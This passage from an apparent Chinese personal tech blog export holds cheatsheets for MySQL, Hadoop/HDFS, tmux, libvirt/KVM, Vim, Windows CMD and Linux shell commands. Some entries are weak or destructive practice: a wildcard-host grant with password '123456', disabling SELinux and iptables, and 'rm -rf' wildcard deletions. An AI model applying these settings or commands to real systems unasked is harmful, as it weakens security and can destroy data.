sex=\u0026#39;m\u0026#39; 删除表中 sex 为 \u0026#39;m\u0026#39; 的数据 drop table b1; 删除表 drop database a1; 删除数据库 select now(); 查看时间 select version(); 查看版本 grant all on *.* to user1@\u0026#39;%\u0026#39; identified by \u0026#39;123456\u0026#39;; 创建 user1 用户并[赋有所有权限]且可在[任何主机]上[访问所有数据库] on to by \u0026#39;%\u0026#39; 任何主机 \u0026#39;localhost\u0026#39; 本机 flush privileges; 刷新用户权限表，另一种不推荐方式 `service mysqld restart` show grants for keystone@\u0026#39;localhost\u0026#39;; 查看用户权限 show variables like \u0026#39;character%\u0026#39;; 查看数据库字符集 +--------------------------+----------------------------+ | Variable_name | Value | +--------------------------+----------------------------+ | character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | utf8 | | character_set_system | utf8 | | character_sets_dir | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 8 rows in set (0.00 sec) MySQL 的配置文件为 /etc/my.conf [mysqld] character-set-server=utf8 default-character-set=utf8 (将被弃用) [client] default-character-set=utf8 重置 MySQL ROOT 密码 vim /etc/my.conf [mysqld] skip-grant-tables service mysqld restart mysql -uroot -p123 update mysql.user set password=PASSWORD(\u0026#39;123456\u0026#39;) where user=\u0026#39;root\u0026#39;; 导入数据库 mysql\u0026gt; source /root/mysql.sql 导出数据库 mysqldump -uroot -p123 mysql \u0026gt; mysql.sql service mysqld start 启动 MySQL 服务 chkconfig mysqld on 设置开机启动服务 MySQL 的历史命令存放在 ~/.mysql_history ","permalink":"https://xhstormr.github.io/blog/posts/hadoop-hive/","summary":"","title":"自学 Hive"},{"content":"Updated on 2016-05-22\nhttps://hadoop.apache.org/\nhttps://hadoop.apache.org/docs/r1.0.4/cn/\n分布式存储(HDFS)，分布式计算(MapReduce)\nHadoop Hadoop 主要包括 4 个模块\nCommon：通用的基础程序以支持其他Hadoop的模块。\nHDFS：分布式文件系统，它提供对应用程序数据的高吞吐量访问。 (Hadoop Distributed File System)\nYARN：一种作业调度和集群资源管理平台，在上面运行分布式计算，典型的计算框架有 MapReduce（批处理） , Storm（流式处理） , Spark（内存计算）。\nMapReduce：基于 YARN 系统的大型数据并行计算框架。\nHadoop 的其它一些子项目\nHive™：支持数据汇总和即席查询的数据仓库。\nHBase™：一种可扩展的支持大量结构化数据存储的分布式数据库。\nMahout™：一种可扩展的机器学习和数据挖掘库。\nPig™：一个高层次的数据流语言和并行计算框架。\nHDFS 架构 主从结构（Master , Slaver） 主节点，可以有多个 namenode （Activity - Standby） 接收用户操作请求，是用户操作的入口 维护文件系统的目录结构，称作命名空间 管理文件与 block 之间关系，block 与 datanode 之间关系 从节点，有很多个 datanode 存储文件 文件被分成 block 存储在磁盘上 为保证数据安全，文件会有多个副本 MapReduce 架构 主从结构 主节点，只有一个 JobTracker 接收客户提交的计算任务 把计算任务分给 TaskTracker 执行，即任务调度 监控 TaskTracker 的执行情况 从节点，有很多个 TaskTracker 执行 JobTracker 分配的计算任务（Map 映射，Reduce 归约） Yarn 架构 主从结构 主节点，只有一个 ResourceManager 集群资源的分配与调度 MapReduce、Storm、Spark 等应用必须实现 ApplicationMaster 接口才能被 RM 管理 从节点，有很多个 NodeManager 单节点资源的管理 Hadoop [root@master sbin]$ ./start-all.sh #启动 Hadoop 集群 [root@master sbin]$ ./stop-all.sh #停止 Hadoop 集群 start-dfs.sh start-mapreduce.sh stop-dfs.sh stop-mapreduce.sh [root@master sbin]$ ./hadoop-daemons.sh #单独启动停止 Hadoop 进程 HDFS 模块启动顺序 * NameNode * DataNode * SecondaryNameNode MapReduce 模块启动顺序 * JobTracker * TaskTracker 关闭顺序相反 [root@master ~]$ jps #查看 Hadoop 进程 4711 Jps 3867 NodeManager 3435 NameNode 3772 ResourceManager 3528 DataNode 启动 Hadoop 时，如果出现错误信息 `: Name or service not knownstname master` 需要将 hadoop-2.7.0/etc/hadoop/slaves 中的主机名换成 IP 地址，本人推荐一开始就写成 IP 地址 HDFS [root@master ~]$ hadoop fs 等同于 [root@master ~]$ hdfs dfs -ls #查看目录结构 -lsr #递归查看目录结构 -du #查看目录下各文件大小 -dus #汇总查看目录下文件大小 -count #统计文件(夹)数量 文件夹 文件 大小 -mv #移动 -cp #复制 -rm #删除 -rmr #递归删除 -put #上传文件 -get #下载文件 -getmerge #下载多个文件并合并 -appendToFile - #通过终端向文件输入内容 -cat #查看文件内容 -text #查看文件内容 -stat #查看文件属性 %b 文件大小 %o block 大小 %r 副本数 %n 文件名 hdfs dfs -stat %b^%o^%n /123.txt -mkdir #创建文件夹 -touchz #创建空文件 -setrep #修改副本数量 replication(复制) -chmod #修改权限 -chown #修改用户组 -expunge #清空回收站 -help [cmd] #帮助 [root@master ~]$ hadoop jar hadoop-mapreduce-examples-2.7.0.jar pi 2 2 #运行 MapReduce [root@master ~]$ hdfs fsck / #文件系统检查工具 -move #移动受损文件到/lost+found -delete\t#删除受损文件 -files\t#显示被检查的文件 -blocks\t#显示块信息报告 -locations #显示每个块的位置信息 [root@master ~]$ hdfs balancer #平衡 block [root@master ~]$ hdfs dfsadmin -report #查看集群状态 -safemode \u0026lt;enter | leave | get | wait\u0026gt; #进入|离开|获知|等待 安全模式 ","permalink":"https://xhstormr.github.io/blog/posts/hadoop/","summary":"","title":"自学 Hadoop"},{"content":"Updated on 2016-04-14\nhttps://github.com/tmux/tmux\nhttps://man.openbsd.org/tmux\nhttps://leanpub.com/the-tao-of-tmux/read\nTmux is a terminal multiplexer.It lets you switch easily between several programs in one terminal, detach them (they keep running in the background) and reattach them to a different terminal.\n一个 Session 可以包含多个 Window，而每个 Window 又可以包含多个 Pane。\nSession 会话 Window 窗口 Pane 面板 Attach 连接 Detach 分离 [root@controller ~]$ yum -y installl tmux #安装 tmux [root@controller ~]$ tmux -V #查看版本号 [root@controller ~]$ tmux lscm #查看内置命令 [root@controller ~]$ tmux new -s home #创建一个叫做 home 的会话 [root@controller ~]$ tmux ls #列出所有会话 0: 1 windows (created Sun Apr 10 13:31:27 2016) [83x47] 1: 1 windows (created Sun Apr 10 13:32:15 2016) [83x47] home: 1 windows (created Sun Apr 10 13:32:07 2016) [83x47] [root@controller ~]$ tmux a -t home #连接到 home 会话，没有指定目标会自动连接到最近使用的会话 Target(目标) [root@controller ~]$ tmux kill-server #关闭所有会话 Ctrl+D or `exit` 退出 Ctrl+B - ? 显示快捷键，Q 退出 Ctrl+B - T 显示时间，Q 退出 Ctrl+B - : 进入命令模式 Ctrl+B - [ 进入复制模式 Ctrl+B - ] 粘贴 Ctrl+B - ~ 查看历史信息 Ctrl+B - PgUp or PgDn 查看历史命令 Session Ctrl+B - D 暂时脱离当前会话（后台运行） Ctrl+B - S 列出所有会话 Ctrl+B - $ 重命名当前会话 Ctrl+B - Ctrl+Z 挂起当前会话 Window Ctrl+B - C 创建新窗口 Ctrl+B - \u0026amp; 关闭当前窗口 Ctrl+B - W 列出所有窗口 Ctrl+B - 2 切换到 2 号窗口 Ctrl+B - L 切换到上一次使用的窗口 Last *当前 -上次 Ctrl+B - P 切换到上一个窗口（Previous） Ctrl+B - N 切换到下一个窗口（Next） Ctrl+B - , 重命名当前窗口 Ctrl+B - . 修改当前窗口编号 Ctrl+B - F 在所有窗口中查找指定文本 Pane Ctrl+B - % 水平创建面板 Ctrl+B - “ 垂直创建面板 Ctrl+B - X 关闭当前面板 Ctrl+B - Z 缩放当前面板 Ctrl+B - O 移动当前面板 Ctrl+B - ! 将当前面板置于新窗口 Ctrl+B - Q 显示面板编号 Ctrl+B - 空格键 切换面板布局 Ctrl+B - 方向键 自由选择面板 Prefix = Ctrl+B .tmux.conf set -g default-terminal \u0026#34;screen-256color\u0026#34; set -ga terminal-overrides \u0026#34;*-256color:Tc\u0026#34; set -g escape-time 0 set -g display-time 1500 set -g history-limit 10000 set -g base-index 1 set -g pane-base-index 1 set -g mouse on set -g set-titles on set -g allow-rename on set -g automatic-rename on set -g focus-events on set -g renumber-windows on set -g aggressive-resize on set -g monitor-activity on set -g mode-keys vi #复制模式设置为 vi, SPACE开始 ENTER结束 set -g default-shell /usr/local/bin/fish # set-hook -g after-new-window \u0026#39;command-prompt -I \u0026#34;#{window_name}\u0026#34; \u0026#34;rename-window \u0026#39;%%\u0026#39;\u0026#34;\u0026#39; bind -n C-k clear-history # Ctrl bind -n C-up switch-client -n bind -n C-down new-window -c \u0026#34;#{pane_current_path}\u0026#34; bind -n C-left prev bind -n C-right next # Shift 选择面板 bind -n S-up select-pane -U bind -n S-down select-pane -D bind -n S-left select-pane -L bind -n S-right select-pane -R # Ctrl+Shift 调整面板 bind -n C-S-up resize-pane -U 5 bind -n C-S-down resize-pane -D 5 bind -n C-S-left resize-pane -L 5 bind -n C-S-right resize-pane -R 5 bind - split-window -v -c \u0026#34;#{pane_current_path}\u0026#34; bind \\\\ split-window -h -c \u0026#34;#{pane_current_path}\u0026#34; bind P pipe-pane -o \u0026#34;cat \u0026gt;\u0026gt; ~/#I.log\u0026#34; \\; display \u0026#34;Toggled logging to ~/#I.log\u0026#34; bind z resize-pane -Z bind r command-prompt -I \u0026#34;#{window_name}\u0026#34; \u0026#34;rename-window \u0026#39;%%\u0026#39;\u0026#34; bind R command-prompt -I \u0026#34;#{session_name}\u0026#34; \u0026#34;rename-session \u0026#39;%%\u0026#39;\u0026#34; bind C-b last-window # double prefix bind C-n next-layout # 切换面板布局 bind C-r source-file ~/.tmux.conf \\; display \u0026#34;Config reloaded!\u0026#34; # tmuxline start set -g status-bg default set -g status-justify right set -g status-left \u0026#34;\u0026#34; set -g status-right \u0026#34;#[fg=white] | #S | #(whoami) | #H | %F %R \u0026#34; set -g status-right-length 100 set -g window-status-format \u0026#34;#{?window_activity_flag,#[bg=brightyellow#,bold],#[fg=white]}#I:#W#F\u0026#34; set -g window-status-current-format \u0026#34;#[fg=brightgreen,bold]➤ #I:#W#F\u0026#34; set -g pane-active-border-style fg=brightyellow # tmuxline end bind -n DoubleClick1Pane new-window bind -n MouseDrag1Status swap-window -t= bind -n MouseDown2Pane run \u0026#39;tmux set-buffer \u0026#34;$(pbpaste)\u0026#34;; tmux paste-buffer\u0026#39; \\; display-message \u0026#34;Pasted from clipboard\u0026#34; bind -T copy-mode-vi MouseDragEnd1Pane send -X copy-pipe-and-cancel \u0026#34;tmux show-buffer | pbcopy\u0026#34; \\; display-message \u0026#34;Copied to clipboard\u0026#34; .bashrc if which tmux \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then #if not inside a tmux session, and if no session is started, start a new session test -z \u0026#34;$TMUX\u0026#34; \u0026amp;\u0026amp; (tmux attach -c `pwd` || tmux new) fi ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-tmux/","summary":"","title":"Tmux 不完全使用手册"},{"content":"Updated on 2016-05-31\nhttps://libvirt.org/\nhttp://www.linux-kvm.org/page/Main_Page\nKVM 负责 CPU 和 RAM 的虚拟化；QEMU 则负责模拟 IO 设备，如网卡和硬盘；KVM 加上 QEMU 之后就能实现真正意义上的服务器虚拟化，称之为 QEMU-KVM。\n而 Libvirt 则是调用 KVM 虚拟化技术的接口间接控制 QEMU-KVM，包含一个API库，一个守护程序 Libvirtd，一个命令行工具 virsh，如果直接用 QEMU-KVM 的接口会非常繁琐。另外 OpenStack 也是用 Libvirt 的库管理 VM，可以控制除了 QEMU 以外的模拟器，包括 VMWARE, VirtualBox, Xen等等。\nLibvirt 部分 yum -y install virt-manager yum -y install libvirt yum -y install kvm yum -y install libguestfs-tools [root@controller ~]$ virsh net-start default #启动虚拟网络 [root@controller ~]$ virsh net-list #查看虚拟网络，默认为 NAT Name State Autostart Persistent -------------------------------------------------- default active yes yes [root@controller ~]$ qemu-img create -f qcow2 /tmp/1.qcow2 10G #创建 qcow2 虚拟磁盘 [root@controller ~]$ virt-install --virt-type kvm --name 1 --ram 1024 \\ --cdrom /tmp/CentOS-6.5-x86_64-bin.iso \\ --disk /tmp/1.qcow2,size=10,format=qcow2 \\ --network network=default \\ --graphics vnc,listen=0.0.0.0 --noautoconsole \\ --os-type=linux --os-variant=rhel6 #创建虚拟机，使用 VNC 远程链接虚拟机 [root@controller ~]$ virsh list #查看已启动的虚拟机 Id Name State ---------------------------------------------------- 1 1 running [root@controller ~]$ virsh vncdisplay 1 #查看 VNC 端口为5901 :1 [root@controller ~]$ virsh start 1 #启动虚拟机 [root@controller ~]$ virsh destroy 1 #停止虚拟机（粗暴） virt-install --os-variant list #查看支持系统版本 virsh list --all #列出所有虚拟机 virsh dominfo 1 #查看虚拟机 virsh dumpxml 1 #显示虚拟机配置文件内容 virsh define /tmp/1.xml #添加虚拟机 定义 virsh create /tmp/1.xml #添加并创建虚拟机 virsh undefine 1 #移除虚拟机 取消定义 virsh suspend 1 #暂停虚拟机 vrish resume 1 #恢复虚拟机 virsh shutdown 1 #停止虚拟机（优雅），需要 `yum -y install acpid` virsh save 1 /tmp/1save #生成虚拟机快照，跳过文件系统缓存--bypass-cache，同时生成XML配置文件--xml 1，还原后自动启动--running virsh restore /tmp/1save --bypass-cache --running #还原虚拟机，需先关闭虚拟机 virsh domblklist 1 #查看虚拟机使用的磁盘文件 qemu-img info 1.qcow2 #查看虚拟磁盘信息 virt-cat 1.qcow2 /etc/passwd #查看虚拟磁盘里的文件 virt-edit 1.qcow2 /etc/passwd #编辑虚拟磁盘里的文件，虚拟机必须处于关机状态 virt-df -h 1.qcow2 #查看虚拟磁盘使用情况 virt-copy-out 1.qcow2 /etc/passwd /tmp/ #拷贝虚拟磁盘中的 passwd 文件到 /tmp 目录下 virt-copy-in 1.qcow2 /tmp/1.txt /root/ #拷贝本地的 1.txt 文件到虚拟磁盘的 /root/ 目录下 [root@controller ~]$ virt-host-validate #检查配置是否正确 QEMU: Checking for hardware virtualization : PASS QEMU: Checking for device /dev/kvm : PASS QEMU: Checking for device /dev/vhost-net : PASS QEMU: Checking for device /dev/net/tun : PASS LXC: Checking for Linux \u0026gt;= 2.6.26 : PASS [root@controller ~]$ dmesg | grep kvm #检查内核日志 [root@controller ~]$ lsmod | grep kvm #显示加载到内核中的模块的状态信息 kvm_intel 54285 0 kvm 333172 1 kvm_intel 名称 大小 依赖模块个数 依赖模块内容 Tips： 虚拟机配置文件在 /etc/libvirt/qemu/ 虚拟网络配置文件在 /etc/libvirt/qemu/networks/ 最好关闭虚拟机内部的 iptables selinux service iptables stop chkconfig iptables off /etc/selinux/config 修改为 SELINUX=disabled setenforce 0 OpenStack 部分 [root@controller ~]$ virt-sysprep -d 1 #清理虚拟机，如 MAC 地址 [root@controller ~]$ virsh undefine 1 #取消定义虚拟机 [root@controller ~]$ virt-sparsify --compress /tmp/1.qcow2 /tmp/1done.qcow2 #压缩镜像（可选） [root@controller ~]$ glance image-create --name 1 --disk-format qcow2 --container-format bare \u0026lt; /tmp/1.qcow2 #上传镜像 ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-libvirt/","summary":"","title":"Libvirt 不完全使用手册"},{"content":"Updated on 2018-01-02\nhttps://github.com/vim/vim\nhttps://vimhelp.org/options.txt.html\nhttp://www.lagmonster.org/docs/vi.html\nVim is often called a \u0026ldquo;programmer\u0026rsquo;s editor,\u0026rdquo; and so useful for programming that many consider it an entire IDE. It\u0026rsquo;s not just for programmers, though. Vim is perfect for all kinds of text editing, from composing email to editing configuration files.\n只要接触 Linux ，不可避免的会用到 Vim 编辑器。一方面它基本上是所有 Linux 发行版的默认编辑器；另一方面它是也一个拥有20年历史的超级强大的文本编辑器。\nvim +5 file #打开文件并跳到第5行，无数字跳到最后一行 vim +/abc file #打开文件并搜索 `abc`，按 n 切换至下一个 `abc` vim file1 file2 file3 #打开3个文件，按 `:n` 切换至下一个文件，`:N` or `:prev` 切换至上一个文件 \u0026lt;----- a、i、o ↓↓ : -----\u0026gt; 输入模式 命令模式 底行模式 ESC -----\u0026gt; \u0026lt;----- ESC 输入模式常用指令 Ctrl+C ESC Ctrl+N 自动补全 next Ctrl+P 自动补全 previous Ctrl+Y 自动输入与上一行相对应的字符 Ctrl+W 删除光标前的一个单词 Ctrl+U 删除光标前的所有字符 Ctrl+R 插入寄存器内容 底行模式常用指令 :w 保存 :w 123 将当前编辑的文件保存到 123 文件中 :q 退出 :q! 不保存退出 :x 保存并退出 :wq 保存并退出 :wqa 全部保存并退出 :15 跳到第15行 :e 123 打开 123 文件 :e! 放弃修改重新编辑 :b1 选择缓冲区(文件) (推荐) :bn 切换至下一缓冲区 :bN 切换至上一缓冲区 :bd 关闭当前缓冲区 :n 切换至下一个文件 :N 切换至上一个文件 :ls 列出打开的所有文件 :history 查看历史命令 :!ls -l 执行外部命令 :s/old/new/ 替换光标所在行第一次出现的 old 为 new :s/old/new/g 替换光标所在行全部的 old 为 new :1,10s/old/new/g 替换1到10行之间出现的 old 为 new :%s/old/new/g 替换全文的 old 为 new :%s/old/new/gc 替换全文的 old 为 new 并询问用户确认每个替换 :%TOhtml 把全文转化为 HTML 网页 命令模式常用指令 h j k l 左 下 上 右 a 在光标后进入输入模式 Append(追加) A 在行尾进入输入模式 i 在光标前进入输入模式 Insert(插入) I 在行首进入输入模式 o 在下方插入一行并进入输入模式 Open(打开) O 在上方插入一行并进入输入模式 b 光标移动到上一个单词 w 光标移动到下一个单词 e 光标移动到单词的结尾 B 光标移动到上一个单词，以空格为分隔符 W 光标移动到下一个单词，以空格为分隔符 E 光标移动到单词的结尾，以空格为分隔符 HOME 移动到行首 END 移动到行尾 PgUp 向上翻页 PgDn 向下翻页 Ctrl+B 向上翻页 Back Ctrl+F 向下翻页 Front D 删除所在行光标之后的内容 Delete(删除) C 删除所在行光标之后的内容并进入输入模式 Change(修改) dd 删除整行 cc 删除整行并进入输入模式 2de 删除光标处开始的 2 个单词 [执行次数，缺省1][操作符][操作对象] 2ce 删除光标处开始的 2 个单词并进入输入模式 yy 复制整行 Yank(复制) 5yy 复制光标处开始的 5 行 p 在光标后粘贴 Put(粘贴) 可粘贴最近一次删除的内容 P 在光标前粘贴 /abc 从光标位置向下搜索 `abc` ?abc 从光标位置向上搜索 `abc` n 显示搜索命令定位到的下一个字符串 N 显示搜索命令定位到的上一个字符串 r 替换当前字符 R 替换当前字符及其后的字符，直至按ESC键 x 删除当前字符 X 删除之前的字符 s 删除当前字符并进入输入模式 S 删除当前行并进入输入模式 u 撤销上一步的操作 U 撤销这一行的操作 Ctrl+R 恢复上一步的操作 ZZ 保存并退出 ZQ 不保存退出 zz 把光标所在的行置于屏幕中央 gg 跳到第一行 G 跳到最后一行 H 跳到屏幕第一行 M 跳到屏幕中间一行 L 跳到屏幕最后一行 % 跳到匹配括号的另一端 * 向下搜索光标下的单词 ^ 行首 $ 行尾 5j 向下移动 5 行 (Jump) 5J 向下合并 5 行 (Join) 15G 跳到第 15 行 Ctrl+D 移动半屏 Ctrl+^ 在打开的文件中切换 Ctrl+G 显示文本信息 g+Ctrl+G 显示全局文本信息 v 可视 V 可视行 Ctrl+Q 可视块 -\u0026gt; Shift+I 批量插入 za 折叠 \u0026lt;-\u0026gt; 展开 zM 折叠所有代码 zR 展开所有代码 di( 删除 () 中的内容 inner da[ 删除 [] 中的内容，包括 [] all dtA 删除从光标处至 A 之间的内容 to dfA 删除从光标处至 A 之间的内容，包括 A found 分割窗口 :sp 123 水平分割窗口并打开文件123 :vsp 123 垂直分割窗口并打开文件123 Ctrl+W - S 水平分割窗口 Ctrl+W - V 垂直分割窗口 Ctrl+W - Q 退出当前窗口 Ctrl+W - W 切换窗口 Ctrl+W - 方向键 选择窗口 Tips： 大部分 Linux 发行版默认编辑器是 Vi，Vim 是它的升级版。 二者的区别： https://zh.m.wikipedia.org/zh-cn/Vi https://zh.m.wikipedia.org/zh-cn/Vim 配置文件： /etc/vimrc yum -y install vim #安装 Vim vim /root/.bashrc #设置别名，替换系统默认编辑器 alias vi=vim https://raw.githubusercontent.com/amix/vimrc/master/vimrcs/basic.vim https://raw.githubusercontent.com/vim/vim/master/runtime/rgb.txt https://raw.githubusercontent.com/vim/vim/master/runtime/doc/motion.txt https://raw.githubusercontent.com/vim/vim/master/runtime/doc/options.txt vimrc set nocp \u0026#34;取消兼容 Vi set hlsearch \u0026#34;高亮搜索 set incsearch \u0026#34;实时搜索 set smartcase \u0026#34;智能区分大小写 set ignorecase \u0026#34;不区分大小写 set ruler \u0026#34;显示行列信息 set number \u0026#34;显示行号信息 set showcmd \u0026#34;显示命令 set showmode \u0026#34;显示模式 set showmatch \u0026#34;显示配对括号 set matchtime=10 \u0026#34;显示 1s set linebreak \u0026#34;整词换行 set wildmenu \u0026#34;显示补全行 set cursorline \u0026#34;高亮当前行 set encoding=utf-8 \u0026#34;设置文件编码 set fileencoding=utf-8 \u0026#34;设置文件编码 set scrolloff=5 \u0026#34;滚动缓冲区 set laststatus=2 \u0026#34;总是显示状态栏 \u0026#34;set statusline=%F%m \u0026#34;设置状态栏 set colorcolumn=78 \u0026#34;对齐线 set backspace=indent,eol,start \u0026#34;使退格键工作 set tabstop=4 \u0026#34;4 空格 set shiftwidth=4 \u0026#34;4 空格 set softtabstop=4 \u0026#34;4 空格 set smarttab \u0026#34;智能 TAB set expandtab \u0026#34;使用空格而不是 TAB set cindent \u0026#34;使用 C 系缩进 set autoindent \u0026#34;自动缩进 set smartindent \u0026#34;智能缩进 set foldmethod=syntax \u0026#34;开启代码折叠 set nofoldenable \u0026#34;不自动进行代码折叠 set virtualedit=block \u0026#34;启用虚拟编辑 setf c \u0026#34;设置文件类型 syntax on \u0026#34;开启语法高亮 syntax enable \u0026#34;开启语法高亮 filetype on \u0026#34;开启文件类型检测 filetype indent on \u0026#34;开启缩进规则 autocmd InsertEnter,InsertLeave * set cursorline! \u0026#34;高亮当前行切换显示 nmap \u0026lt;silent\u0026gt; \u0026lt;F2\u0026gt; :nohlsearch \u0026lt;CR\u0026gt; \u0026#34;在命令模式下按 F2 相当于输入 `:nohlsearch` 跟一个回车，取消搜索高亮 nmap \u0026lt;silent\u0026gt; \u0026lt;F8\u0026gt; :w \u0026lt;CR\u0026gt; :!gcc % -o %\u0026lt; \u0026amp;\u0026amp; %\u0026lt; \u0026lt;CR\u0026gt; \u0026#34;保存 -\u0026gt; 编译 -\u0026gt; 运行 nmap \u0026lt;silent\u0026gt; \u0026lt;C-H\u0026gt; \u0026lt;C-W\u0026gt;h \u0026#34;快速选择窗口 nmap \u0026lt;silent\u0026gt; \u0026lt;C-J\u0026gt; \u0026lt;C-W\u0026gt;j nmap \u0026lt;silent\u0026gt; \u0026lt;C-K\u0026gt; \u0026lt;C-W\u0026gt;k nmap \u0026lt;silent\u0026gt; \u0026lt;C-L\u0026gt; \u0026lt;C-W\u0026gt;l let mapleader=\u0026#34;;\u0026#34; \u0026#34;定义 \u0026lt;Leader\u0026gt; vmap \u0026lt;Leader\u0026gt;y \u0026#34;+y \u0026#34;vim 复制至系统剪贴板 nmap \u0026lt;Leader\u0026gt;p \u0026#34;+p \u0026#34;系统剪贴板粘贴至 vim if has(\u0026#34;gui_running\u0026#34;) \u0026#34;GUI colorscheme evening \u0026#34;配色方案 set lines=50 columns=120 \u0026#34;窗口大小 set guifont=Consolas:h10:cANSI \u0026#34;字体大小 set guicursor+=a:blinkon0 \u0026#34;取消光标闪烁 set guioptions-=m \u0026#34;取消菜单栏 set guioptions-=T \u0026#34;取消工具栏 set guioptions-=l \u0026#34;取消左滚动条 set guioptions-=L \u0026#34;取消左滚动条 nmap \u0026lt;silent\u0026gt; \u0026lt;F3\u0026gt; :call ToggleScreen()\u0026lt;CR\u0026gt; nmap \u0026lt;silent\u0026gt; \u0026lt;F4\u0026gt; :call ToggleMenu()\u0026lt;CR\u0026gt; let s:flag_screen = 0 let s:flag_menu = 0 function ToggleScreen() if s:flag_screen simalt ~r~ \u0026#34;窗口还原 else simalt ~x~ \u0026#34;窗口最大化 endif let s:flag_screen = !s:flag_screen \u0026#34;\u0026#34;取反 endfunction function ToggleMenu() if s:flag_menu set guioptions-=m set guioptions-=T else set guioptions+=m set guioptions+=T endif let s:flag_menu = !s:flag_menu endfunction endif ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-vim/","summary":"","title":"Vim 命令不完全手册"},{"content":"Updated on 2017-01-16\n修改 CMD 页面编码 chcp 65001 改用 UTF-8 编码 修改 CMD 页面字体 在标题栏上点击右键，选择 \u0026#34;属性\u0026#34; -\u0026gt; \u0026#34;字体\u0026#34;，将字体修改为 True Type 字体 \u0026#34;Consolas\u0026#34;。 其他编码格式 chcp 437 英文 chcp 932 日文 chcp 949 韩文 chcp 936 简体中文 chcp 950 繁体中文 修改 CMD 默认页面编码 更改 HKEY_CURRENT_USER\\Console 或 HKEY_CURRENT_USER\\Console\\%SystemRoot%_system32_cmd.exe 中的 CodePage 为页面代码的 16 进制格式 使 CMD 支持 ANSI 转义序列 https://github.com/adoxa/ansicon/releases/latest ","permalink":"https://xhstormr.github.io/blog/posts/cmd-use-utf8/","summary":"","title":"CMD 使用 UTF-8 编码"},{"content":"Updated on 2018-02-08\nhttps://www.centos.org/\nhttp://man7.org/linux/man-pages/dir_all_alphabetic.html\n最近因为要参加全国云计算比赛，需要使用 Linux；所以我把关于 Linux 系统的一些命令整理在这里，以便查阅。\nUpdate：市赛以第一名出线，国赛获得二等奖。\nUpdate 2：学校要求我留下，继续参加下一届比赛。\npwd #查看当前路径 date #查看当前时间 type #查看命令类型 file #查看文件类型 -i 显示MIME类别 stat #查看文件属性 cat #查看文件内容 Concatenate head #查看文件内容头10行 tail #查看文件内容尾10行 -f 监视文件最新增加的内容 Follow touch #创建空文件 ip -s -h address #查看网卡信息 wc #统计文本 -l -w -c 行数 单词数 字节数 less #分屏显示 -5 每次显示5行 -N 显示行号 more #分页显示 -5 每次显示5行 推荐使用 less reset #初始化终端 env #查看环境变量 set #查看环境变量 + Shell 变量 ls -a #显示隐藏文件 -d #只显示当前文件夹信息 -l #以列表形式显示详细信息 -F #显示类型标识符 /目录 *可执行文件 @符号链接 =Sockets套接字 |FIFO命令管道 普通文件无标识符 Classify(分类) -h #人性化显示大小 -i #显示inode -I #排除匹配文件 -r #反向排序 Reverse(相反) -R #操作文件夹下的所有文件 Recursive(递归) -S #按文件大小降序排列 Size -t #按文件时间排序 Time [root@controller ~]$ ll -Shr #人性化显示大小并按大小升序排列 total 20K -rw-------. 1 root root 1.2K Mar 29 14:35 anaconda-ks.cfg -rw-r--r--. 1 root root 3.1K Mar 29 14:34 install.log.syslog -rw-r--r--. 1 root root 8.9K Mar 29 14:35 install.log [root@controller ~]$ ls -lF total 24 -rw-------. 1 root root 1208 Apr 12 14:42 anaconda-ks.cfg -rw-r--r--. 1 root root 9114 Apr 12 16:22 install.log -rw-r--r--. 1 root root 3161 Apr 12 14:41 install.log.syslog drwxr-xr-x. 2 root root 4096 Apr 13 06:06 test/ -rwxr-xr-x. 1 root root 0 Apr 13 06:06 test.sh* [root@controller ~]$ ls -l total 20 -rw-------. 1 root root 986 Mar 18 10:14 anaconda-ks.cfg -rw-r--r--. 1 root root 9072 Mar 18 10:14 install.log -rw-r--r--. 1 root root 3161 Mar 18 10:13 install.log.syslog 10位 前1(-文件 d目录 l连接) 后9(rw-r--r--) rw-r--r--(333) u所属用户 g所属组 o其他人 r读 w写 x执行 1引用计数 root所属用户 root所属组 9072文件大小 Tips : ll = ls -l ls `cat 123` ``包含的命令 bash 会先执行 ll /root/{1,2} 等同于 ll /root/1 /root/2 mkdir -p #递归创建目录 mkdir -p 1/2/3 cd cd #进入当前用户家目录 cd ~ #进入当前用户家目录 cd - #进入上一次目录 cd .. #进入上一级目录 rmdir rmdir #删除空白目录，不常用 rm -r #操作文件夹下的所有文件 Recursive(递归) -f #不显示确认信息 -v #显示详细信息 rm -rf * rm -rf `ls | grep -v word` #删除除了 word 之外的所有文件 删除文件名前带有特殊字符的文件 rm -rf -- -1 rm -rf ./-1 创建文件名前带有特殊字符的文件 cp -- 1 -1 -1 cp 1 \\\\1 \\1 chattr -R #操作文件夹下的所有文件 Recursive(递归) + 属性 #开启属性 - 属性 #关闭属性 第二扩展文件系统属性： a：让文件或目录仅供附加用途 b：不更新文件或目录的最后存取时间 c：将文件或目录压缩后存放 d：将文件或目录排除在倾倒操作之外 i：不得任意更动文件或目录 s：保密性删除文件或目录 S：即时更新文件或目录 u：预防意外删除 [root@controller ~]$ chattr +i 123 #添加 i 属性，保护文件 [root@controller ~]$ lsattr #查看文件的第二扩展文件系统属性 ----i--------e- ./123 [root@controller ~]$ rm -rf 123 #不能删除 rm: cannot remove 123: Operation not permitted [root@controller ~]$ chattr -i 123 #关闭属性 [root@controller ~]$ rm -rfv 123 removed 123 [root@controller ~]$ chattr +a 123 #只能往里面追加内容，不能删除 cp cp [选项] [原文件或目录] [目标目录] -u #只复制比目标新的文件 -r #操作文件夹下的所有文件 Recursive(递归) -p #连带文件属性复制 -d #若原文件是链接文件，则复制链接属性 -a #相当于 -rpd cp /root/123 . 复制文件到当前目录 cp /root/123{,.bak} 备份文件，相当于 cp /root/123 /root/123.bak mv mv [选项] [原文件或目录] [目标目录] -u #只移动比目标新的文件 mv 123 1 #相当于重命名 ln ln [原文件] [目标文件] -s #创建软链接 soft，不加则创建硬链接 hard，需使用绝对路径 软链接：类似于windows快捷方式，删除原文件，软连接不能使用 硬链接：拥有相同的i节点和存储block块，可以看作同一个文件，删除其中之一，另一个还能使用，可通过i节点识别，不能跨分区和针对目录使用，相当于backup，防止误删。 z echo \u0026#39;. ~/z.sh\u0026#39; \u0026gt;\u0026gt; .bashrc #安装 z https://github.com/rupa/z https://raw.githubusercontent.com/rupa/z/master/z.sh z.lua echo \u0026#39;lua ~/z.lua --init fish once | source\u0026#39; \u0026gt;\u0026gt; 